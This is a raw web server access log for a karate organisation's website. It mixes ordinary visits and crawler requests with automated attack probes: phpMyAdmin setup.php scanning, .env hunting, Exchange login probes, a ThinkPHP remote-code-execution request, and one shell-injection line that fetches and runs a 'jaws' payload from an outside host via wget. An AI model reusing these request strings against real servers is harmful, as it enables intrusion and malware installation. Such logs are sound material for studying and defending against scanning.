::ffff:173.186.216.169 - - [16/Jun/2023:00:00:02 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "https://www.wadokikai.org/resources" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"
::ffff:47.254.21.232 - - [16/Jun/2023:13:32:26 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:32:26 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:32:27 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:32:27 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:32:32 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:32:32 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:32:40 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.7/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:32:44 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:32:45 +0000] "GET http://34.212.47.6:80/pma/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:32:45 +0000] "GET http://34.212.47.6:80/phpMyAdmin3/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:32:49 +0000] "GET http://34.212.47.6:80/myadmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:32:50 +0000] "GET http://34.212.47.6:80/MyAdmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:32:51 +0000] "GET http://34.212.47.6:80/PHPMYADMIN/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:32:52 +0000] "GET http://34.212.47.6:80/mysqladmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:33:20 +0000] "GET http://34.212.47.6:80/admin/pma/scripts/setup.php HTTP/1.0" 404 166 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:33:26 +0000] "GET http://34.212.47.6:80/web/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 171 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:33:29 +0000] "GET http://34.212.47.6:80/webadmin/scripts/setup.php HTTP/1.0" 404 165 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:33:34 +0000] "GET http://34.212.47.6:80/dbadmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:33:36 +0000] "GET http://34.212.47.6:80/mysql/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:33:36 +0000] "GET http://34.212.47.6:80/phpMyAdmin2/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:33:41 +0000] "GET http://34.212.47.6:80/sqlweb/scripts/setup.php HTTP/1.0" 404 163 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:33:46 +0000] "GET http://34.212.47.6:80/webdb/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:33:50 +0000] "GET http://34.212.47.6:80/websql/scripts/setup.php HTTP/1.0" 404 163 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:33:50 +0000] "GET http://34.212.47.6:80/_phpMyAdmin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:33:56 +0000] "GET http://34.212.47.6:80/admin/phpmyadmin/scripts/setup.txt HTTP/1.0" 404 173 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:33:58 +0000] "GET http://34.212.47.6:80/db/scripts/setup.php HTTP/1.0" 404 159 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:34:03 +0000] "GET http://34.212.47.6:80/mysqlmanager/scripts/setup.php HTTP/1.0" 404 169 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:34:03 +0000] "GET http://34.212.47.6:80/phpmanager/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:34:03 +0000] "GET http://34.212.47.6:80/php-myadmin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:34:07 +0000] "GET http://34.212.47.6:80/phpmy-admin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:47.254.21.232 - - [16/Jun/2023:13:34:09 +0000] "GET http://34.212.47.6:80/mysql-admin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:24 +0000] "GET / HTTP/1.1" 200 57394 "http://wadokikai.org" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Nicecrawler/1.1; +http://www.nicecrawler.com/) Chrome/90.0.4430.97 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:26 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:26 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:26 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:26 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:26 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:26 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:26 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:26 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:27 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:27 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:27 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:27 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:27 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:27 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:28 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:32 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:35 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:38 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:38 +0000] "GET /schools HTTP/1.1" 200 97308 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:39 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:39 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.132 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:39 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:39 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:39 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:40 +0000] "GET /events HTTP/1.1" 200 5867 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:40 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:40 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:40 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:40 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:40 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:40 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:41 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:41 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:69.160.160.54 - - [16/Jun/2023:13:37:41 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
::ffff:65.49.20.66 - - [16/Jun/2023:13:37:52 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.2.987 Yowser/2.5 Safari/537.36"
::ffff:65.49.20.66 - - [16/Jun/2023:13:39:29 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0"
::ffff:65.49.20.66 - - [16/Jun/2023:13:40:27 +0000] "GET /geoserver/web/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.2.987 Yowser/2.5 Safari/537.36"
::ffff:51.89.5.185 - - [16/Jun/2023:13:52:11 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.89.5.185 - - [16/Jun/2023:13:52:12 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:178.62.216.118 - - [16/Jun/2023:13:52:57 +0000] "GET /aaa9 HTTP/1.1" 404 143 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:178.62.216.118 - - [16/Jun/2023:13:53:15 +0000] "GET /aab8 HTTP/1.1" 404 143 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:178.62.216.118 - - [16/Jun/2023:13:53:36 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:64.227.88.13 - - [16/Jun/2023:13:56:13 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 214 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
::ffff:64.227.88.13 - - [16/Jun/2023:13:56:13 +0000] "GET /owa/auth/logon.aspx HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
::ffff:5.188.86.6 - - [16/Jun/2023:14:01:35 +0000] "GET /owa/auth/logon.aspx?replaceCurrent=1&url=https://34.212.47.6/ecp HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36"
::ffff:83.97.73.89 - - [16/Jun/2023:14:03:48 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:179.43.177.244 - - [16/Jun/2023:14:13:43 +0000] "GET / HTTP/1.1" 200 57394 "-" "Hello World"
::ffff:135.125.246.110 - - [16/Jun/2023:14:26:39 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [16/Jun/2023:14:26:39 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [16/Jun/2023:14:39:46 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [16/Jun/2023:14:39:47 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:45.128.232.62 - - [16/Jun/2023:14:48:34 +0000] "GET / HTTP/1.1" 200 57394 "-" "Linux Gnu (cow)"
::ffff:51.89.5.185 - - [16/Jun/2023:14:49:41 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.89.5.185 - - [16/Jun/2023:14:49:42 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [16/Jun/2023:14:58:55 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [16/Jun/2023:14:58:56 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:107.170.246.12 - - [16/Jun/2023:15:12:14 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:54.36.148.127 - - [16/Jun/2023:15:13:47 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.15 - - [16/Jun/2023:15:13:50 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:103.116.53.215 - - [16/Jun/2023:15:19:37 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+103.16.161.29/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:45.79.171.66 - - [16/Jun/2023:15:28:26 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:83.97.73.89 - - [16/Jun/2023:15:30:34 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:95.161.223.250 - - [16/Jun/2023:15:39:19 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:40.88.21.235 - - [16/Jun/2023:16:03:50 +0000] "GET / HTTP/1.1" 200 57394 "http://wadokikai.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:40.88.21.235 - - [16/Jun/2023:16:03:50 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/images/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:66.205.145.202 - - [16/Jun/2023:16:03:59 +0000] "GET /schools HTTP/1.1" 200 97308 "https://duckduckgo.com/" "Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36"
::ffff:66.205.145.202 - - [16/Jun/2023:16:03:59 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "https://wadokikai.org/schools" "Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36"
::ffff:66.205.145.202 - - [16/Jun/2023:16:03:59 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "https://wadokikai.org/schools" "Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36"
::ffff:66.205.145.202 - - [16/Jun/2023:16:03:59 +0000] "GET /images/instructors/JohnPWKK.jpg HTTP/1.1" 200 7574 "https://wadokikai.org/schools" "Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36"
::ffff:66.205.145.202 - - [16/Jun/2023:16:03:59 +0000] "GET /images/instructors/arce.jpg HTTP/1.1" 200 14433 "https://wadokikai.org/schools" "Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36"
::ffff:66.205.145.202 - - [16/Jun/2023:16:03:59 +0000] "GET /images/instructors/carlos.jpg HTTP/1.1" 200 21431 "https://wadokikai.org/schools" "Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36"
::ffff:66.205.145.202 - - [16/Jun/2023:16:03:59 +0000] "GET /images/instructors/jorge8th.jpg HTTP/1.1" 200 26779 "https://wadokikai.org/schools" "Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36"
::ffff:66.205.145.202 - - [16/Jun/2023:16:03:59 +0000] "GET /images/instructors/geoffrey.jpg HTTP/1.1" 200 14922 "https://wadokikai.org/schools" "Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36"
::ffff:66.205.145.202 - - [16/Jun/2023:16:03:59 +0000] "GET /images/instructors/anthony.jpg HTTP/1.1" 200 14045 "https://wadokikai.org/schools" "Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36"
::ffff:66.205.145.202 - - [16/Jun/2023:16:03:59 +0000] "GET /images/instructors/anunley.jpg HTTP/1.1" 200 32690 "https://wadokikai.org/schools" "Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36"
::ffff:66.205.145.202 - - [16/Jun/2023:16:03:59 +0000] "GET /images/instructors/justin.jpg HTTP/1.1" 200 14091 "https://wadokikai.org/schools" "Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36"
::ffff:66.205.145.202 - - [16/Jun/2023:16:03:59 +0000] "GET /images/instructors/grant.jpg HTTP/1.1" 200 14249 "https://wadokikai.org/schools" "Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36"
::ffff:66.205.145.202 - - [16/Jun/2023:16:03:59 +0000] "GET /images/instructors/herseybaker.jpg HTTP/1.1" 200 13988 "https://wadokikai.org/schools" "Mozilla/5.0 (X11; CrOS x86_64 13904.97.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.167 Safari/537.36"
